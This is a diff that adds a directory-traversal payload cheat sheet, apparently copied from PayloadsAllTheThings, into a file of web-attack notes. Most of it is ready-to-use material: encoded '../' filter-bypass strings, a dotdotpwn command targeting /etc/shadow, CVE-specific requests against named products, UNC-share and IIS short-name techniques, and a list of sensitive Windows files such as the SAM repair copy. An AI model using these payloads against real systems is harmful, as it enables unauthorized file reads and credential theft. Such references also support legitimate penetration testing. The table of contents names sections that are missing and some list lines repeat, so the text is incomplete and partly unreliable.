@@ -576,7 +576,210 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 
 https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md 
 ---
+# Directory Traversal
 
+* [Methodology](#methodology)
+    * [URL Encoding](#url-encoding)
+    * [Double URL Encoding](#double-url-encoding)
+    * [Unicode Encoding](#unicode-encoding)
+    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
+    * [Mangled Path](#mangled-path)
+    * [NULL Bytes](#null-bytes)
+    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
+* [Exploit](#exploit)
+    * [UNC Share](#unc-share)
+    * [ASPNET Cookieless](#asp-net-cookieless)
+    * [IIS Short Name](#iis-short-name)
+    * [Java URL Protocol](#java-url-protocol)
+* [Path Traversal](#path-traversal)
+    * [Linux Files](#linux-files)
+    * [Windows Files](#windows-files)
+
+## Tools
+
+* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
+
+    ```powershell
+    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
+    ```
+## Methodology
+
+We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
+
+```powershell
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+```
+
+### URL Encoding
+
+| Character | Encoded |
+| --- | -------- |
+| `.` | `%2e` |
+| `/` | `%2f` |
+| `\` | `%5c` |
+
+**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
+
+```ps1
+{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+```
+
+### Double URL Encoding
+
+Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.
+
+| Character | Encoded |
+| --- | -------- |
+| `.` | `%252e` |
+| `/` | `%252f` |
+| `\` | `%255c` |
+
+**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
+
+```ps1
+{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+```
+
+### Unicode Encoding
+
+| Character | Encoded |
+| --- | -------- |
+| `.` | `%u002e` |
+| `/` | `%u2215` |
+| `\` | `%u2216` |
+
+**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
+
+```js
+{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+```
+
+### Overlong UTF-8 Unicode Encoding
+
+The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
+
+| Character | Encoded |
+| --- | -------- |
+| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
+| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
+| `\` | `%c0%5c`, `%c0%80%5c` |
+
+### Mangled Path
+
+Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.
+
+```powershell
+..././
+...\.\
+```
+
+**Example:**: Mirasys DVMS Workstation <=5.12.6
+
+```ps1
+{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
+```
+
+### NULL Bytes
+
+A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
+
+**Example:** Homematic CCU3 CVE-2019-9726
+
+```js
+{{BaseURL}}/.%00./.%00./etc/passwd
+```
+
+**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575
+
+```js
+{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
+```
+
+### Reverse Proxy URL Implementation
+
+Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
+
+```powershell
+..;/
+```
+
+**Example**: Pascom Cloud Phone System CVE-2021-45967
+
+A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
+
+```js
+{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
+```
+### UNC Share
+
+A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.
+
+An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.
+
+```powershell
+\\localhost\c$\windows\win.ini
+```
+
+Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
+
+### IIS Short Name
+
+The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
+
+* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
+
+    ```ps1
+    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
+    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
+    ```
+
+* [bitquark/shortscan](https://github.com/bitquark/shortscan)
+
+    ```ps1
+    shortscan http://example.org/
+    ```
+### Windows Files
+
+The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.
+
+```powershell
+C:\Windows\win.ini
+C:\windows\system32\license.rtf
+```
+
+A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
+
+```powershell
+c:/inetpub/logs/logfiles
+c:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
+```
 # 5. Parameter Tampering (All Parameters Change)
 
 **Description:** The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control. 
